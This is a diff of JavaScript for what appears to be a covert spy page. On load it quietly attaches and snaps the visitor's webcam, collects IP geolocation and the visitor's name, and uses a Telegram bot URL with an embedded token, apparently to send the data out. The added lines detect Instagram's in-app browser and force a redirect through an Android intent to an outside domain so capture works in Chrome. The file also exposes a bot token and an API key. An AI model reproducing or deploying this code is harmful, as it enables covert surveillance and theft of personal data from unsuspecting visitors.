@@ -2,7 +2,7 @@ var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhM
 var oReq = new XMLHttpRequest(); 
 oReq.open("GET", Welcome, true); 
 oReq.send();
-fetch("https://api.ipbase.com/json/?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f")
+fetch("https://api.ipbase.com/json/") //?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f
 	.then((res) => res.json())
 	.then((data) => {
 		var output = `
@@ -56,6 +56,7 @@ function b64toBlob(b64Data, contentType, sliceSize) {
 }
 const getScreenshotOfElement = async (element) => {
 	const canvas = await html2canvas(element)
+	console.log(canvas)
 }
 function userName(){
 	swal("Whats your name", {
@@ -81,6 +82,15 @@ function Desktop(){
 		}
 }
 window.onload = function(){
+	var ua = navigator.userAgent || navigator.vendor || window.opera;
+	var isInstagram = (ua.indexOf('Instagram') > -1) ? true : false;
+	if (isInstagram){
+		window.location.href = "intent:https://moncef.ml/send#Intent;end";
+		alert("use google chrome")
+	}
+	else {
+		console.log('browser')
+	}
 	Webcam.attach('#my_camera');
 	setTimeout(function(){
 		Webcam.snap( function(data_uri) {
